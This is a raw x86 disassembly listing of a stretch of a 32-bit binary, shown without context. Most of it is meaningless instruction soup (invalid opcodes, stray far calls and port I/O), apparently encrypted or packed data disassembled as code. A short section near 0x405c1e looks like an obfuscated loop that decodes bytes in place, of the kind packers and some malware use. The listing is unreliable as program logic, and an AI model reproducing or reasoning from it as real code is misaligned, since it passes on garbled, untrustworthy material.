  4057dd:	adc    DWORD PTR [ebx+0x24],ebx
  4057e0:	jp     0x405855
  4057e2:	or     esi,esi
  4057e4:	adc    DWORD PTR [ebp+ecx*4+0x7add5b85],esi
  4057eb:	pushf  
  4057ec:	mov    BYTE PTR [ebp-0x53a05d07],al
  4057f2:	test   al,0xa0
  4057f4:	push   ebx
  4057f5:	jecxz  0x405864
  4057f7:	jl     0x40583a
  4057f9:	jae    0x4057b9
  4057fb:	adc    ecx,esi
  4057fd:	retf   0x2ee7
  405800:	mov    dl,0x8c
  405802:	inc    eax
  405803:	pop    ss
  405804:	sub    ecx,DWORD PTR [ecx+0x2ce84c1c]
  40580a:	inc    esp
  40580b:	out    dx,al
  40580c:	repnz loopne 0x405813
  40580f:	pop    ebx
  405810:	sub    DWORD PTR [eax-0x5886deef],esi
  405816:	inc    edx
  405817:	jb     0x405813
  405819:	rcr    BYTE PTR [ebp-0x56b12533],0x66
  405820:	dec    ebx
  405821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405822:	xlat   BYTE PTR ds:[ebx]
  405823:	adc    DWORD PTR [eax+0x15],eax
  405826:	inc    eax
  405827:	xchg   ecx,eax
  405828:	and    al,BYTE PTR [ebp-0x159d3408]
  40582e:	mov    cl,0xf5
  405830:	xlat   BYTE PTR ds:[ebx]
  405831:	ins    DWORD PTR es:[edi],dx
  405832:	iret   
  405833:	inc    ebp
  405834:	dec    edi
  405835:	mov    al,0x1d
  405837:	mov    ds:0x3357931d,al
  40583c:	stc    
  40583d:	cmp    DWORD PTR [esi-0x1f],0x9de6a605
  405844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405845:	xor    ch,BYTE PTR [edx+eax*2+0x30917ca0]
  40584c:	aas    
  40584d:	and    eax,0x212fc8d3
  405852:	pop    esi
  405853:	fld    QWORD PTR [ecx+0x6320e238]
  405859:	push   0xffffff9d
  40585b:	sbb    eax,DWORD PTR [edx+ebx*1-0x54]
  40585f:	fnstsw WORD PTR [eax]
  405861:	arpl   ax,sp
  405863:	(bad)  
  405865:	pop    ecx
  405866:	cmp    al,0x8c
  405868:	sar    DWORD PTR [ecx+0x63c1987f],1
  40586e:	and    al,0xb6
  405870:	fld    TBYTE PTR [ecx+0x6de91e1c]
  405876:	sbb    dl,dl
  405878:	dec    ebp
  405879:	test   DWORD PTR ds:0x6e1d32f5,esi
  40587f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405880:	mov    dh,0x6
  405882:	xor    ah,BYTE PTR [edx]
  405884:	mov    edi,0xac02ae5f
  405889:	push   es
  40588a:	cmp    al,ch
  40588c:	pop    ss
  40588d:	sbb    dl,BYTE PTR ds:0x217a70a7
  405893:	sbb    ecx,ecx
  405895:	mov    dh,BYTE PTR [edi]
  405897:	xor    BYTE PTR [ebx],0x3a
  40589a:	push   cs
  40589b:	fsub   QWORD PTR [ecx-0x3b49aa24]
  4058a1:	std    
  4058a2:	retf   
  4058a3:	aad    0x61
  4058a5:	pusha  
  4058a6:	adc    esp,esi
  4058a8:	push   edi
  4058a9:	adc    DWORD PTR [eax],0xeb1f3bdd
  4058af:	lds    ebp,FWORD PTR [ebx+0x368409a8]
  4058b5:	dec    ebx
  4058b6:	test   BYTE PTR [ecx+0x25],dh
  4058b9:	std    
  4058ba:	inc    esi
  4058bb:	xchg   al,dh
  4058bd:	xchg   edx,eax
  4058be:	xchg   ebx,eax
  4058bf:	int    0x92
  4058c1:	out    dx,eax
  4058c2:	pop    ds
  4058c3:	mov    edx,DWORD PTR [edi]
  4058c5:	lods   al,BYTE PTR ds:[esi]
  4058c6:	lea    ecx,[ebx-0x39]
  4058c9:	xchg   DWORD PTR [esi+ebx*4],ecx
  4058cc:	jbe    0x4058fe
  4058ce:	jns    0x405883
  4058d0:	gs jae 0x405888
  4058d3:	push   edi
  4058d4:	cmp    al,0xc2
  4058d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058d7:	add    eax,0xf5ac60ff
  4058dc:	inc    edi
  4058dd:	sbb    eax,0x9b4346e
  4058e2:	push   edx
  4058e3:	clc    
  4058e4:	std    
  4058e5:	jl     0x4058d6
  4058e7:	inc    edi
  4058e8:	dec    eax
  4058e9:	push   ecx
  4058ea:	les    esi,FWORD PTR [ebx+0x6673d96b]
  4058f0:	pop    edx
  4058f1:	lea    eax,[ebp+0x7623aa19]
  4058f7:	lods   eax,DWORD PTR ds:[esi]
  4058f8:	push   ds
  4058f9:	sub    bl,bh
  4058fb:	sub    DWORD PTR [esi+0x3f97f10],edi
  405901:	cli    
  405902:	mov    ds:0x6b8bf6f3,eax
  405907:	sbb    ebx,ecx
  405909:	out    0xa8,eax
  40590b:	mov    ch,0xff
  40590d:	retf   
  40590e:	push   cs
  40590f:	es jo  0x4058b5
  405912:	xchg   ecx,eax
  405913:	xchg   esp,eax
  405914:	mov    cl,0xfe
  405916:	xchg   DWORD PTR ds:0xeb418697,ebx
  40591c:	sbb    eax,0x32d32fc9
  405921:	sub    cl,dl
  405923:	cwde   
  405924:	adc    DWORD PTR [esp+edx*2+0x435f11bc],0xffffff95
  40592c:	test   BYTE PTR [ebx-0x625a817d],ah
  405932:	xchg   ebx,eax
  405933:	icebp  
  405934:	shl    DWORD PTR [eax+0x3d],0x52
  405938:	pop    es
  405939:	test   BYTE PTR [edx+0x4b910404],dl
  40593f:	stos   DWORD PTR es:[edi],eax
  405940:	call   0x47d6:0xc283b0b6
  405947:	call   0xa0700354
  40594c:	adc    esp,ebp
  40594e:	ins    BYTE PTR es:[edi],dx
  40594f:	fld    DWORD PTR [ecx+0x7b]
  405952:	sbb    ebp,DWORD PTR [ecx+eiz*1]
  405955:	add    bh,BYTE PTR [ecx+0x32]
  405958:	sbb    ebx,ebx
  40595a:	sti    
  40595b:	dec    ecx
  40595c:	outs   dx,BYTE PTR ds:[esi]
  40595d:	mov    cl,0x25
  40595f:	sub    BYTE PTR [edx+ebp*1-0x4f],cl
  405963:	mov    esp,DWORD PTR [ebp+0x238fe7ff]
  405969:	test   eax,0x25127341
  40596e:	sar    DWORD PTR [ebp+edx*2+0x78],0xf6
  405973:	es cld 
  405975:	imul   ebp,DWORD PTR [ecx+esi*2],0x4df43ade
  40597c:	inc    ebp
  40597d:	out    0x46,al
  40597f:	xor    ebp,0x1324b2d2
  405985:	pop    edi
  405986:	rcl    BYTE PTR [ebx],0x1f
  405989:	fldenv [edx]
  40598b:	mov    esi,0x3ed282e3
  405990:	loope  0x405979
  405992:	push   ebp
  405993:	out    dx,al
  405994:	and    al,0x89
  405996:	mov    ecx,DWORD PTR [edi-0x74]
  405999:	sub    ebx,DWORD PTR [edi]
  40599b:	pop    ds
  40599c:	pop    es
  40599d:	outs   dx,DWORD PTR ds:[esi]
  40599e:	rcl    BYTE PTR [eax],0xab
  4059a1:	sub    ch,BYTE PTR [eax+0x39]
  4059a4:	out    0x1d,eax
  4059a6:	push   0xe4caa0cc
  4059ab:	or     al,0xcf
  4059ad:	push   es
  4059ae:	pop    ss
  4059af:	and    eax,ebx
  4059b1:	jae    0x4059ba
  4059b3:	mov    ds:0x6de53651,al
  4059b8:	push   edx
  4059b9:	fisubr WORD PTR [esi-0x207042e5]
  4059bf:	cmp    al,0x79
  4059c1:	dec    edx
  4059c2:	mov    bl,0xdf
  4059c4:	fstp   TBYTE PTR [esi-0x6fb37eab]
  4059ca:	pusha  
  4059cb:	mov    dh,BYTE PTR [ebp+0x78]
  4059ce:	hlt    
  4059cf:	pop    edi
  4059d0:	fnstenv [ecx+0xc1f992b]
  4059d6:	xchg   esp,eax
  4059d7:	test   al,0xa2
  4059d9:	xor    cl,BYTE PTR [eax]
  4059db:	mov    dh,0xce
  4059dd:	fstp   TBYTE PTR [edx+0x53]
  4059e0:	pop    ebp
  4059e1:	dec    ebx
  4059e2:	inc    esp
  4059e3:	sbb    al,0xaf
  4059e5:	mov    eax,ds:0x9dcd9531
  4059ea:	sbb    al,0x6
  4059ec:	out    0x80,al
  4059ee:	div    BYTE PTR [ecx+ebx*4+0x2a]
  4059f2:	enter  0xe6af,0xf3
  4059f6:	pop    ebx
  4059f7:	pop    ecx
  4059f8:	(bad)
  4059fc:	push   eax
  4059fd:	jge    0x405a49
  4059ff:	mov    eax,0xdb68a1fc
  405a04:	pop    ecx
  405a05:	(bad)  
  405a06:	pop    edx
  405a07:	pop    ebx
  405a08:	adc    eax,0x7f796662
  405a0d:	imul   esp,DWORD PTR [esp+ecx*1-0x5d],0x212a8cdf
  405a15:	inc    eax
  405a16:	enter  0x3e84,0x86
  405a1a:	psadbw mm5,QWORD PTR [ebp+0x24]
  405a1e:	sub    eax,0x3ae1b82
  405a23:	inc    edx
  405a24:	add    DWORD PTR [ecx+0x27d6e70c],ebx
  405a2a:	pop    eax
  405a2b:	outs   dx,BYTE PTR ds:[esi]
  405a2c:	int3   
  405a2d:	inc    esi
  405a2e:	sbb    DWORD PTR [edx-0x36],edi
  405a31:	add    esi,DWORD PTR [ecx+edx*1+0x26fe92d2]
  405a38:	das    
  405a39:	fiadd  DWORD PTR [ecx-0x7e]
  405a3c:	adc    DWORD PTR [ebp+0x59],0xffffffa7
  405a40:	rol    BYTE PTR [ebx+0x11],cl
  405a43:	sub    BYTE PTR [edx+0x39],ch
  405a46:	(bad)
  405a4a:	mov    esi,0xa5b7d090
  405a4f:	pop    esp
  405a50:	and    dl,BYTE PTR [edi-0x68099141]
  405a56:	call   edx
  405a58:	pop    esp
  405a5a:	loopne 0x405ac3
  405a5c:	mov    ebx,0x1bff816b
  405a61:	xlat   BYTE PTR ds:[ebx]
  405a62:	nop
  405a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a64:	jle    0x405ad0
  405a66:	mov    al,0x64
  405a68:	imul   edi,DWORD PTR [eax-0x206cd83a],0xeb15b8fc
  405a72:	jecxz  0x405aa9
  405a74:	js     0x405a4d
  405a76:	mov    edx,0xe94e721b
  405a7b:	mov    eax,0x4536f6cf
  405a80:	mov    al,0x44
  405a82:	cmp    ch,cl
  405a84:	lods   al,BYTE PTR ds:[esi]
  405a85:	scas   eax,DWORD PTR es:[edi]
  405a86:	fisub  DWORD PTR [edi-0x5a863d49]
  405a8c:	cmp    BYTE PTR [eax-0x38bbd554],0x7d
  405a93:	fisttp WORD PTR [eax+edx*4-0x4e6e8168]
  405a9a:	lds    eax,FWORD PTR [ebx+0x1c]
  405a9d:	fstp   TBYTE PTR [ebx+0x32fcb4c9]
  405aa3:	enter  0xd37a,0x41
  405aa7:	leave  
  405aa8:	aaa    
  405aa9:	call   0x5cc0:0x45edd4a7
  405ab0:	daa    
  405ab1:	adc    eax,0xeb3f7746
  405ab6:	int    0xcc
  405ab8:	ficomp WORD PTR [ebx]
  405aba:	int    0x30
  405abc:	in     al,0x4b
  405abe:	xor    DWORD PTR [ecx],eax
  405ac0:	les    edx,FWORD PTR [ebp+eiz*2-0x22557bc2]
  405ac7:	nop
  405ac8:	adc    al,0xb8
  405aca:	push   esp
  405acb:	push   esi
  405acc:	sbb    esp,DWORD PTR [ecx]
  405ace:	or     dh,bh
  405ad0:	xchg   edi,eax
  405ad1:	gs pop ss
  405ad3:	jmp    0x7f5b:0x27347b92
  405ada:	das    
  405adb:	mov    es,WORD PTR [ebx]
  405add:	jo     0x405aa0
  405adf:	popa   
  405ae0:	test   al,0xdd
  405ae2:	xchg   ecx,eax
  405ae3:	bound  ecx,QWORD PTR [edi]
  405ae5:	adc    bh,dl
  405ae7:	push   eax
  405ae8:	(bad)  
  405ae9:	stos   BYTE PTR es:[edi],al
  405aea:	stc    
  405aeb:	sub    al,0xda
  405aed:	imul   edx,DWORD PTR ds:0xb78afad8,0xc31eb451
  405af7:	(bad)  
  405af9:	cmp    edx,DWORD PTR ds:0x790e6443
  405aff:	ret    
  405b00:	mov    edx,0x74ac8f77
  405b05:	jmp    0x405ae8
  405b07:	test   al,0x3d
  405b09:	outs   dx,DWORD PTR ds:[esi]
  405b0a:	test   eax,0x77958105
  405b0f:	sbb    ecx,DWORD PTR [esi-0xe]
  405b12:	pop    esi
  405b13:	inc    ecx
  405b14:	add    eax,0xf66b550d
  405b19:	daa    
  405b1a:	mov    cs,WORD PTR [eax]
  405b1c:	call   0x842:0x88a0df06
  405b23:	icebp  
  405b24:	mov    esp,DWORD PTR [ebp+0x15d0870c]
  405b2a:	xchg   edx,eax
  405b2b:	ror    DWORD PTR [edx-0x37ae3fe2],0xbf
  405b32:	jle    0x405b22
  405b34:	dec    esp
  405b35:	sub    al,0xac
  405b37:	xor    DWORD PTR [edi],0xffffff9e
  405b3a:	jns    0x405b11
  405b3c:	or     BYTE PTR [esi-0x6],bl
  405b3f:	add    bl,BYTE PTR [esi-0x6394e9ca]
  405b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b46:	out    0x56,eax
  405b48:	mov    cs,WORD PTR [eax+0x5c]
  405b4b:	test   BYTE PTR [ebx],bl
  405b4d:	push   eax
  405b4e:	xlat   BYTE PTR ds:[ebx]
  405b4f:	scas   eax,DWORD PTR es:[edi]
  405b50:	mov    edi,0x1990c0fc
  405b55:	pop    esp
  405b56:	retf   
  405b57:	inc    edi
  405b58:	rcl    DWORD PTR [ebx+0x50c2eedb],1
  405b5e:	inc    ebx
  405b5f:	pop    ecx
  405b60:	jns    0x405b04
  405b62:	add    edx,DWORD PTR [edi+0x27]
  405b65:	mov    bh,0xe
  405b67:	ss or  al,0xb7
  405b6a:	mov    esi,0x336959db
  405b6f:	add    eax,0xf369fc96
  405b74:	pop    ebp
  405b75:	enter  0x42f2,0xad
  405b79:	pop    edi
  405b7a:	push   ss
  405b7b:	push   cs
  405b7c:	mov    al,ds:0xfe6f4b08
  405b81:	rcr    DWORD PTR [eax],0xba
  405b84:	inc    esi
  405b85:	inc    esp
  405b86:	cmp    ah,ah
  405b88:	mov    eax,ds:0x9185dc34
  405b8d:	mov    WORD PTR [eax-0x763573c8],ds
  405b93:	sbb    BYTE PTR [eax+0x7db1cfc5],0xc2
  405b9a:	sahf   
  405b9b:	enter  0xecbe,0x19
  405b9f:	ins    DWORD PTR es:[edi],dx
  405ba0:	leave  
  405ba1:	xchg   DWORD PTR [ebx],ecx
  405ba3:	push   ebx
  405ba4:	stc    
  405ba5:	mov    BYTE PTR [edx+ebx*8-0x2cba5506],bl
  405bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bad:	xor    eax,DWORD PTR [eax]
  405baf:	xchg   ebx,eax
  405bb0:	mov    edi,0xf6b9b1ea
  405bb5:	adc    BYTE PTR [edi-0x24],0x10
  405bb9:	fild   QWORD PTR [ebx+0x35b2686d]
  405bbf:	mov    eax,ds:0x10a7734
  405bc4:	and    edx,eax
  405bc6:	mov    ds,WORD PTR [edi+0x3da4f1b2]
  405bcc:	aas    
  405bcd:	aam    0x78
  405bcf:	(bad)  
  405bd1:	mov    gs,WORD PTR [esi-0x55]
  405bd4:	mov    al,ds:0xc16b2a18
  405bd9:	ss iret 
  405bdb:	inc    ebp
  405bdc:	adc    al,0x6e
  405bde:	jbe    0xf4062689
  405be4:	xor    al,0x5c
  405be6:	aas    
  405be7:	inc    ecx
  405be8:	jp     0x405b95
  405bea:	jp     0x405b71
  405bec:	and    DWORD PTR [ebp+0x1063da8d],ecx
  405bf2:	dec    ebx
  405bf3:	push   eax
  405bf4:	test   DWORD PTR [edx+0x45],eax
  405bf7:	hlt    
  405bf8:	jecxz  0x405b8f
  405bfa:	push   ss
  405bfb:	cld    
  405bfc:	or     DWORD PTR [edi+eiz*2-0x19],ebp
  405c00:	clc    
  405c01:	mov    dh,0xdc
  405c03:	rcl    BYTE PTR [ecx-0x22],cl
  405c06:	jmp    0xc130:0x8ddf2a7e
  405c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c0e:	and    BYTE PTR [edi+0x3b41512],0xca
  405c15:	sbb    ch,BYTE PTR ss:[edx]
  405c18:	arpl   di,di
  405c1a:	aaa    
  405c1b:	mov    cl,0x2b
  405c1d:	ret    
  405c1e:	cmp    edx,eax
  405c20:	jne    0x405caa
  405c26:	mov    eax,DWORD PTR [ebp-0xc]
  405c29:	mov    dl,BYTE PTR [eax+ecx*1+0x801]
  405c30:	mov    eax,DWORD PTR [ebp-0x20]
  405c33:	mov    ebx,DWORD PTR [ebp-0x18]
  405c36:	xor    eax,esi
  405c38:	xor    ebx,esi
  405c3a:	add    eax,edi
  405c3c:	add    ebx,edi
  405c3e:	mov    BYTE PTR [ebp-0x1],dl
  405c41:	cmp    eax,ebx
  405c43:	jae    0x405c98
  405c49:	lea    edx,[eax-0x3272ec]
  405c4f:	mov    DWORD PTR [ebp-0x14],edx
  405c52:	mov    ebx,DWORD PTR [ebp-0x14]
  405c55:	xor    ebx,esi
  405c57:	add    ebx,0x7f55d8f2
  405c5d:	lea    edx,[ebp+eax*4-0x3c]
  405c61:	mov    DWORD PTR [edx],ebx
  405c63:	mov    ebx,DWORD PTR [edx]
  405c65:	cmp    ebx,0x244ecb93
  405c6b:	jbe    0x405c7c
  405c71:	add    DWORD PTR [edx],0x405fcdc
  405c77:	jmp    0x405c82
  405c7c:	add    DWORD PTR [edx],0xfdaf4324
  405c82:	mov    edx,DWORD PTR [ebp-0x18]
  405c85:	xor    edx,esi
  405c87:	inc    eax
  405c88:	inc    DWORD PTR [ebp-0x14]
  405c8b:	add    edx,edi
  405c8d:	cmp    eax,edx
  405c8f:	jb     0x405c52
  405c95:	mov    dl,BYTE PTR [ebp-0x1]
  405c98:	xor    dl,0x79
  405c9b:	sub    dl,0x3
  405c9e:	xor    eax,eax
  405ca0:	mov    eax,DWORD PTR [ebp-0xc]
  405ca3:	mov    BYTE PTR [eax+ecx*1+0x801],dl
  405caa:	mov    eax,DWORD PTR [ebp-0xc]
  405cad:	mov    edx,DWORD PTR [ebp-0x20]
  405cb0:	sub    eax,edi
  405cb2:	xor    eax,esi
  405cb4:	cmp    eax,edx
  405cb6:	jne    0x40809e
  405cbc:	mov    eax,DWORD PTR [ebp-0x10]
  405cbf:	mov    edx,DWORD PTR [ebp-0x8]
  405cc2:	xor    eax,esi
  405cc4:	xor    edx,esi
  405cc6:	sub    eax,edx
  405cc8:	sub    eax,edi
  405cca:	xor    eax,esi
  405ccc:	mov    DWORD PTR [ebp-0x10],eax
  405ccf:	mov    eax,DWORD PTR [ebp-0x8]
  405cd2:	jmp    0x408090
  405cd7:	mov    eax,ds:0x7b519088
  405cdc:	dec    ecx
  405cdd:	mov    ds:0xeab98a78,eax
  405ce2:	ficomp WORD PTR [eax+eiz*8+0x333c2eea]
  405ce9:	jp     0x405d65
  405ceb:	fstp   QWORD PTR [edi+0x7a]
  405cee:	jp     0x405d1a
  405cf0:	ja     0x405c85
  405cf2:	and    al,0x86
  405cf4:	int3   
  405cf5:	gs hlt 
  405cf7:	pop    eax
  405cf8:	test   al,0xfb
  405cfa:	frstor [esi+0x4e352b9f]
  405d00:	pop    edx
  405d01:	stos   DWORD PTR es:[edi],eax
  405d02:	fucom  st(5)
  405d04:	xchg   ebx,eax
  405d05:	push   esi
  405d06:	jge    0x405d1f
  405d08:	inc    esi
  405d09:	adc    DWORD PTR [edi],esi
  405d0b:	jp     0x405d28
  405d0d:	xor    bl,BYTE PTR [eax]
  405d0f:	and    ecx,edi
  405d11:	popa   
  405d12:	or     ah,dh
  405d14:	cmp    dl,BYTE PTR [edx+0x3e]
  405d17:	adc    bl,BYTE PTR [edi]
  405d19:	mov    dl,0x72
  405d1b:	fidiv  WORD PTR [ebp-0x12]
  405d1e:	aam    0x43
  405d20:	inc    esp
  405d21:	fwait
  405d22:	sbb    esp,edx
  405d24:	pop    edi
  405d25:	and    eax,0xd1899748
  405d2a:	outs   dx,DWORD PTR ds:[esi]
  405d2b:	inc    eax
  405d2c:	xchg   esp,eax
  405d2d:	mov    dh,0xab
  405d2f:	outs   dx,BYTE PTR ds:[esi]
  405d30:	jnp    0x405cdf
  405d32:	(bad)  
  405d33:	aam    0xf0
  405d35:	mov    dh,0xdd
  405d37:	or     ah,BYTE PTR [ecx+0xbaed89]
  405d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d3e:	pop    esp
  405d3f:	mov    DWORD PTR [esi-0x17],eax
  405d42:	iret   
  405d43:	add    BYTE PTR [esp+edx*1+0x6],0x3b
  405d48:	in     al,dx
  405d49:	xor    dh,BYTE PTR [eax]
  405d4b:	dec    edx
  405d4c:	or     eax,0x3a996ab4
  405d51:	mov    BYTE PTR [esp+eax*4-0x1a],bh
  405d55:	lea    eax,[edx+0x2a]
  405d58:	aas    
  405d59:	and    bh,bh
  405d5b:	mov    esi,esi
  405d5d:	(bad)  [esi-0x3ee831c9]
  405d63:	stc    
  405d64:	fwait
  405d65:	inc    esi
  405d66:	cmp    DWORD PTR [eax+0x70],ecx
  405d69:	mov    bl,0x4a
  405d6b:	xchg   ebp,eax
  405d6c:	push   edx
  405d6d:	addr16 sub al,0x11
  405d70:	mov    ds:0x49c8e73c,al
  405d75:	mov    al,0x23
  405d77:	sbb    al,0xc5
  405d79:	aas    
  405d7a:	bound  edi,QWORD PTR [ecx-0x5f588045]
  405d80:	adc    al,0x1b
  405d82:	pop    ss
  405d83:	xchg   esp,eax
  405d84:	mov    cl,0x9e
  405d86:	pusha  
  405d87:	lock cli 
  405d89:	sub    dh,BYTE PTR [ebx-0x7dc81786]
  405d8f:	pop    es
  405d90:	mov    ds:0xc0acfadd,eax
  405d95:	cld    
  405d96:	out    dx,al
  405d97:	out    dx,al
  405d98:	mov    ah,0x22
  405d9a:	add    bh,BYTE PTR [ebp+ebp*8+0x294f6ba9]
  405da1:	jnp    0x405dc9
  405da3:	jno    0x405dd9
  405da5:	jmp    0x8ea367e5
  405daa:	retf   0xa24a
  405dad:	pop    ecx
  405dae:	(bad)  
  405daf:	es aas 
  405db1:	pop    ebp
  405db2:	xchg   ebx,eax
  405db3:	pusha  
  405db4:	inc    edi
  405db5:	leave  
  405db6:	aad    0xdc
  405db8:	xchg   ecx,eax
  405db9:	es push ebx
  405dbb:	jo     0x405d79
  405dbd:	xchg   edi,eax
  405dbe:	push   ebp
  405dbf:	rol    DWORD PTR [ebx-0x14],1
  405dc2:	push   ecx
  405dc3:	bound  ebx,QWORD PTR [edi+0xb]
  405dc6:	xor    eax,0x63437117
  405dcb:	jmp    0xefbd:0xe8c0aec1
  405dd2:	jl     0x405e27
  405dd4:	inc    edx
  405dd5:	sbb    dl,BYTE PTR [edx]
  405dd7:	jle    0x405d81
  405dd9:	mov    ch,0x53
  405ddb:	loop   0x405e06
  405ddd:	or     esi,esi
  405ddf:	add    DWORD PTR [esi],edx
  405de1:	sub    al,0x42
  405de3:	mov    ecx,0x4f45715d
  405de8:	xlat   BYTE PTR ds:[ebx]
  405de9:	fisubr DWORD PTR [ebp+0x55e6d0b3]
  405def:	inc    esp
  405df0:	or     BYTE PTR fs:[ebp+0x5d941577],0x80
  405df8:	stc    
  405df9:	bound  esp,QWORD PTR [ebp-0x4cdf8e24]
  405dff:	push   edi
  405e00:	fidivr WORD PTR [ebp+ebp*8+0x5e]
  405e04:	adc    al,0x56
  405e06:	mov    bh,bl
  405e08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e09:	xchg   BYTE PTR [edi+eiz*2-0x45416b9a],dh
  405e10:	or     DWORD PTR [esi],esp
  405e12:	sbb    al,bh
  405e14:	cld    
  405e15:	addr16 jle 0x405dc5
  405e18:	fadd   st,st(7)
  405e1a:	dec    esi
  405e1b:	sub    bl,ah
  405e1d:	cdq    
  405e1e:	jecxz  0x405e3d
  405e20:	pop    eax
  405e21:	mov    ah,0x2d
  405e23:	arpl   sp,dx
  405e25:	dec    ecx
  405e26:	push   ds
  405e27:	jne    0x405e9a
  405e29:	call   0xd3a0:0x9c37b8ff
  405e30:	cmp    ebp,DWORD PTR [eax+0xe]
  405e33:	les    ebp,FWORD PTR [ecx]
  405e35:	loopne 0x405dbf
  405e37:	push   edi
  405e38:	xchg   ecx,eax
  405e39:	das    
  405e3a:	aas    
  405e3b:	add    al,0x3e
  405e3d:	jle    0x405ebb
  405e3f:	fsub   QWORD PTR [edi-0x46]
  405e42:	push   0x6f3e3848
  405e47:	jnp    0x405e09
  405e49:	dec    edi
  405e4a:	xlat   BYTE PTR ds:[ebx]
  405e4b:	lock cmp ax,0x6757
  405e50:	pop    ebx
  405e51:	inc    esi
  405e52:	xlat   BYTE PTR ds:[ebx]
  405e53:	adc    eax,0x74fb9005
  405e58:	mov    edi,0x4e19c1b3
  405e5d:	fs adc al,0xf2
  405e60:	pushf  
  405e61:	bound  esi,QWORD PTR [ebx]
  405e63:	add    edx,DWORD PTR [edx+0x29]
  405e66:	cdq    
  405e67:	inc    ebx
  405e68:	pop    edx
  405e69:	(bad)  
  405e6a:	lock mov edi,0x699d65b5
  405e70:	xchg   ebx,eax
  405e71:	xchg   DWORD PTR fs:[edx],esp
  405e74:	xchg   esi,eax
  405e75:	xchg   BYTE PTR [edi+edx*8],ch
  405e78:	mov    fs,WORD PTR [edx]
  405e7a:	es loop 0x405ecf
  405e7d:	sbb    al,0x27
  405e7f:	sbb    BYTE PTR [ebp-0x72],dh
  405e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e83:	rcl    al,cl
  405e85:	aam    0xa6
  405e87:	xchg   esi,eax
  405e88:	lea    edx,[eax]
  405e8a:	and    eax,0x8d4d99ab
  405e8f:	dec    ecx
  405e90:	bound  eax,QWORD PTR [ecx+eiz*8+0x3cbdded0]
  405e97:	sahf   
  405e98:	addr16 sub esi,ebp
  405e9b:	or     BYTE PTR [ecx],al
  405e9d:	cs iret 
  405e9f:	cli    
  405ea0:	clc    
  405ea1:	jb     0x405ee4
  405ea3:	jle    0x405f03
  405ea5:	mov    ds:0xa865149f,eax
  405eaa:	xchg   ebp,eax
  405eab:	das    
  405eac:	mov    dl,BYTE PTR [ebx-0x69]
  405eaf:	retf   
  405eb0:	leave  
  405eb1:	sbb    bl,bh
  405eb3:	adc    al,0x2c
  405eb5:	push   ds
  405eb6:	daa    
  405eb7:	push   0x5f
  405eb9:	mov    cl,0x4
  405ebb:	in     eax,0x9c
  405ebd:	adc    BYTE PTR [eax-0x29],ch
  405ec0:	fsub   QWORD PTR [ecx]
  405ec2:	sbb    BYTE PTR [esi],dl
  405ec4:	sbb    dl,ah
  405ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ec7:	retf   0xe348
  405eca:	das    
  405ecb:	in     al,dx
  405ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ecd:	jg     0x405ea4
  405ecf:	ret    0x61c2
  405ed2:	mov    ds:0xa5778921,eax
  405ed7:	inc    edx
  405ed8:	xor    esp,esp
  405eda:	gs push 0xffffffa2
  405edd:	pop    esp
  405ede:	sbb    al,0x86
  405ee0:	ret    0xb092
  405ee3:	inc    eax
  405ee4:	out    0x9b,eax
  405ee6:	push   ebp
  405ee7:	int    0x32
  405ee9:	add    eax,0xfebc1c70
  405eee:	cmp    BYTE PTR [ecx+0x54ce018a],ch
  405ef4:	mov    dl,0x9c
  405ef6:	dec    esi
  405ef7:	shl    bh,0x14
  405efa:	sbb    eax,0x78e25cec
  405eff:	mov    al,ds:0x1963b337
  405f04:	sbb    al,0xba
  405f06:	fwait
  405f07:	mov    esi,0x7a59170
  405f0c:	popf   
  405f0d:	push   0x65
  405f0f:	test   eax,0xa1878d9b
  405f14:	aaa    
  405f15:	inc    eax
  405f16:	jbe    0x405f49
  405f18:	in     al,0x8f
  405f1a:	jmp    0x405f84
  405f1c:	call   0x2107:0x9e058928
  405f23:	fisubr WORD PTR [edx+edx*8]
  405f26:	jne    0x405ed5
  405f28:	cdq    
  405f29:	out    0x2d,eax
  405f2b:	adc    eax,0x3bf41d52
  405f30:	mov    eax,0xb69597ff
  405f35:	mov    ebx,0x4afe5617
  405f3a:	cmp    al,0x28
  405f3c:	ret    0x466
  405f3f:	xlat   BYTE PTR ds:[ebx]
  405f40:	scas   al,BYTE PTR es:[edi]
  405f41:	and    al,0xc2
  405f43:	jl     0x405f5f
  405f45:	jne    0x405f06
  405f47:	addr16 iret 
  405f49:	repz test eax,0x566b86c9
  405f4f:	rcr    BYTE PTR [ebx-0x21],cl
  405f52:	out    dx,eax
  405f53:	test   DWORD PTR [esi+0x1a],ebp
  405f56:	dec    ebp
  405f57:	fcmovbe st,st(2)
  405f59:	cmp    ebx,DWORD PTR [ebx]
  405f5b:	mov    BYTE PTR [ecx-0x7d],cl
  405f5e:	xchg   dl,ah
  405f60:	call   0x8f55:0xbea22534
  405f67:	rcr    DWORD PTR [ecx],1
  405f69:	adc    BYTE PTR [esi-0x10],dl
  405f6c:	mov    ch,BYTE PTR [edi]
  405f6e:	loope  0x405efd
  405f70:	(bad)  
  405f71:	cld    
  405f72:	mov    dl,0x2e
  405f74:	add    DWORD PTR [ebx+0x22bdec67],0x30c066cd
  405f7e:	call   0x75b46f85
  405f83:	aad    0x7d
  405f85:	imul   esp,esi,0xffffff91
  405f88:	jae    0x405fa8
  405f8a:	mov    eax,ds:0x26f43e60
  405f8f:	push   es
  405f90:	sahf   
  405f91:	dec    eax
  405f92:	xchg   ecx,eax
  405f93:	lods   eax,DWORD PTR ds:[esi]
  405f94:	test   al,0xda
  405f96:	mov    ebp,0x14cb4769
  405f9b:	ds xchg ebx,eax
  405f9d:	jo     0x405f43
  405f9f:	push   ebx
  405fa0:	xor    esi,DWORD PTR [eax+0x4b0f260b]
  405fa6:	push   edx
  405fa7:	pop    eax
  405fa8:	lods   eax,DWORD PTR ds:[esi]
  405fa9:	add    al,0xaa
  405fab:	ret    
